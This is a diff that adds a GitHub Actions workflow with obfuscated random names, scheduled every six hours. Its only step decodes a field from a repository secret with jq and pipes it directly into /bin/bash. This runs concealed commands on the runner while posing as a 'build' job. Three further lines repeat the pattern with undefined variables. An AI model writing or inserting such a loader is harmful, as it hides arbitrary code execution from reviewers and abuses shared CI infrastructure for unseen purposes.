@@ -1,0 +1,19 @@
+name: zhouerlv6745
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhouerlv6745
+        env:
+          cp60645: ${{ secrets.cp60645 }}
+        run: |
+          echo $cp60645 | jq -r .lgy174 | /bin/bash
+          echo $ha8 | jq -r .pyvmk36 | /bin/bash
+          echo $vd98055 | jq -r .yau8028 | /bin/bash
+          echo $zfnrd75117 | jq -r .hqdt38888 | /bin/bash
+
